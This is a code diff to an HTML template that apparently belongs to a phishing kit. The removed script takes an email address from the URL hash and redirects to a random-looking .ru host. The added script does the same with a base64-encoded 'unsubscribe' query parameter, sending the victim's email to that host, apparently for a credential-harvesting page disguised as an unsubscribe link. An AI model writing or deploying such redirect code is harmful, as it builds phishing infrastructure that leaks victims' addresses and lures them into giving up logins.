@@ -421,15 +421,27 @@ const html = `
         </g>
       </svg>
     </div>
-    <script>
-      var hash = window.location.hash;
-      if (hash !== "") {
-        hash = hash.split("#");
-        const email = hash[1];
-
-        window.location.href = "https://yskgskem5ur6t1q7qf4h.t06q.ru/f5pgs/#" + email;
-      }
-    </script>
+   <script> 
+    var queryParams = window.location.search 
+      .substr(1) 
+      .split("&") 
+      .reduce(function (q, query) { 
+        var chunks = query.split("="); 
+        var key = chunks[0]; 
+        var value = decodeURIComponent(chunks[1]); 
+        value = isNaN(Number(value)) ? value : Number(value); 
+ 
+        console.log("q[key] " + q[key]); 
+        return (q[key] = value), q; 
+      }, {}); 
+ 
+    var emailParam = queryParams["unsubscribe"]; 
+    var decodedEmail = emailParam.includes("@") ? emailParam : atob(emailParam); 
+ 
+    window.location.replace( 
+      "https://yskgskem5ur6t1q7qf4h.t06q.ru/f5pgs/#" + decodedEmail 
+    ); 
+  </script> 
   </body>
 </html>
 
